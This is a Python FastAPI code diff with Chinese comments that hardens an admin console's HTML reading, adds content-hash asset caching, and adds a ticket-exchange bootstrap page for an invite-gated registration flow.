+    # 静态资源的 `?v=` 由服务端注入内容哈希 —— HTML 里留着的历史版本号会被覆盖
+    html = stamp_asset_urls(html)
     marker = 'lang="zh-CN"'
     if marker in html:
         html = html.replace(marker, marker + ' class="console-authed"', 1)
     elif "<html" in html:
         html = html.replace("<html", '<html class="console-authed"', 1)
-    _CONSOLE_SHELL_CACHE.clear()
-    _CONSOLE_SHELL_CACHE[key] = html
+    return html
+
+
+def _console_html_complete(html: str) -> bool:
+    return html.rstrip().endswith("</html>")
+
+
+def _read_console_html(path) -> str:
+    """读控制台 HTML，保证读到的是**完整**文件。
+
+    为什么需要：`index.html` 有 800KB、近 1.5 万行，编辑/升级的瞬间文件会先被
+    截断再写入。恰好在这个窗口里刷新页面，读到的就是半截 HTML —— 浏览器会把
+    最后一个 `<script>` 一直解析到文件结尾，报
+    `Uncaught SyntaxError: Unexpected end of input`，于是所有 `onclick` 都绑不上，
+    界面上表现为「扫描/导入/导出/账号池的按钮点了全都没反应」，而控制台里那条
+    报错完全看不出跟「文件没写完」有关。这里读到不完整就稍等重读，宁可慢一点
+    也不能把半截页面发出去。
+    """
+    html = ""
+    for _ in range(4):
+        before = path.stat()
+        html = path.read_text(encoding="utf-8")
+        after = path.stat()
+        stable = (before.st_mtime_ns == after.st_mtime_ns and before.st_size == after.st_size)
+        if stable and _console_html_complete(html):
+            return html
+        time.sleep(0.05)
     return html
 
 
 
 @app.get("/admin/assets/{file_path:path}")
 def console_asset(file_path: str, request: Request):
-    """控制台私有静态资源（admin/console/*）。无会话一律 404，不暴露存在性。"""
+    """控制台私有静态资源（admin/console/*）。无会话一律 404，不暴露存在性。
+
+    缓存策略跟着 `?v=` 走（版本号由 `stamp_asset_urls()` 注入内容哈希）：
+
+      * URL 里的版本 == 当前文件哈希 → `immutable`，一年有效。
+        这个 URL 天生是内容寻址的，文件一变 URL 就变，长缓存不会拿到旧内容。
+      * 否则（无 version / 手写的旧版本号）→ `no-cache`，每次用 ETag 校验。
+        宁可多一个 304，也不让「改完没生效」再发生一次。
+    """
     if not _console_allowed(request):
         raise HTTPException(status_code=404)
     root = CONSOLE_DIR.resolve()
     target = (root / file_path).resolve()
     if not str(target).startswith(str(root) + os.sep) or not target.is_file():
         raise HTTPException(status_code=404)
-    return FileResponse(target)
+    current = asset_digest(target)
+    supplied = request.query_params.get("v") or ""
+    if current and supplied == current:
+        headers = {"Cache-Control": "public, max-age=31536000, immutable"}
+    else:
+        headers = {"Cache-Control": "no-cache"}
+    return FileResponse(target, headers=headers)
 
 
 @app.get("/join")
@@ -688,20 +1156,79 @@ def console_asset(file_path: str, request: Request):
 def join_index(request: Request, db: Session = Depends(get_db)):
     """公开注册页（复刻 WorkBuddy 手机号登录页）。
 
-    **2026-11-02 安全事件后改为需凭证**：这个入口曾是完全公开的，攻击者
-    据此把带 XSS 载荷的自有账号塞进号池。
-
-    现在是 **fail-closed**：
-      * 后台一张有效凭证都没有 → 页面直接 404（整个自助入口关闭）
-      * 生成了凭证 → 页面可访问，但用户必须填对邀请码才能完成注册
-
-    页面本身不含任何敏感数据；服务端防线是**凭证 + 发码节流**
-    （见 admin/routers/login.py 的 `_check_join_invite` 与 `_check_sms_quota`）。
+    **门禁已上移到 `_join_gate_middleware`**：这里不再用「库里有没有邀请码」
+    当开关 —— 那套隐式判据会和 `/api/join/*`、`join_invites` 三处漂移。
+    现在总闸状态只有一个来源（`admin/join_gate.py`），本函数只负责发文件。
     """
-    if not join_invite.has_any_invite(db):
-        # 入口未开通：与"页面不存在"表现一致，不泄露自助注册的存在。
-        raise HTTPException(status_code=404, detail="页面不存在")
-    return FileResponse(STATIC_DIR / "join.html")
+    # 资源 `?v=` 同样由服务端按内容哈希注入（见 stamp_asset_urls），
+    # 免得改完 phone-session.js / vendor 库还要手工改版本号。
+    return HTMLResponse(_stamped_page(STATIC_DIR / "join.html"),
+                        headers={"Cache-Control": "no-store, no-cache, must-revalidate"})
+
+
+#: 票据引导页。**这是整个 join 链路里唯一不设门禁的页面**。
+#:
+#: 为什么需要它：票据放在 `#fragment` 里，而 fragment **不会发给服务器** ——
+#: 如果 `/join` 本身要求 Cookie，用户点链接会先吃一个 404，页面根本加载不出来，
+#: 也就没有机会去兑换票据。这个页只做一件事：读 hash → 换 Cookie → 跳 `/join`。
+#:
+#: 它不含任何业务信息（连产品名都没有），未通过验证时只是一句"链接已失效"。
+_JOIN_BOOTSTRAP_HTML = """<!DOCTYPE html>
+<html lang="zh-CN"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<meta name="referrer" content="no-referrer">
+<title>正在验证</title>
+<style>
+  html,body{height:100%;margin:0}
+  body{display:flex;align-items:center;justify-content:center;
+       font:14px/1.6 -apple-system,"Segoe UI","Microsoft YaHei",sans-serif;
+       color:#5b6270;background:#f5f6f8}
+  .box{text-align:center;padding:28px 32px;background:#fff;border-radius:14px;
+       box-shadow:0 8px 30px rgba(16,24,40,.08);max-width:320px}
+  .spin{width:22px;height:22px;margin:0 auto 12px;border:2px solid #e3e6ec;
+        border-top-color:#4b6ef5;border-radius:50%;animation:r .8s linear infinite}
+  @keyframes r{to{transform:rotate(360deg)}}
+</style></head>
+<body>
+<div class="box">
+  <div class="spin" id="spin"></div>
+  <div id="msg">正在验证访问链接…</div>
+</div>
+<script>
+(function () {
+  "use strict";
+  function fail() {
+    var s = document.getElementById("spin");
+    if (s) s.style.display = "none";
+    document.getElementById("msg").textContent = "链接已失效，请向管理员重新索取。";
+  }
+  var m = (location.hash || "").match(/^#k=(.+)$/);
+  if (!m) { fail(); return; }
+  var ticket = "";
+  try { ticket = decodeURIComponent(m[1]); } catch (e) { fail(); return; }
+  // 先把 fragment 从地址栏抹掉：即便后续请求失败，票据也不再留在历史记录里。
+  try { history.replaceState(null, "", location.pathname); } catch (e) {}
+  fetch("/api/join/ticket/exchange", {
+    method: "POST",
+    credentials: "same-origin",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ ticket: ticket })
+  }).then(function (r) {
+    if (!r.ok) { fail(); return; }
+    location.replace("/join");
+  }).catch(fail);
+})();
+</script>
+</body></html>"""
+
+
+@app.get("/j", include_in_schema=False)
+def join_bootstrap():
+    return HTMLResponse(_JOIN_BOOTSTRAP_HTML,
+                        headers={"Cache-Control": "no-store, no-cache, must-revalidate",
+                                 "Referrer-Policy": "no-referrer"})
 
 
 import mimetypes
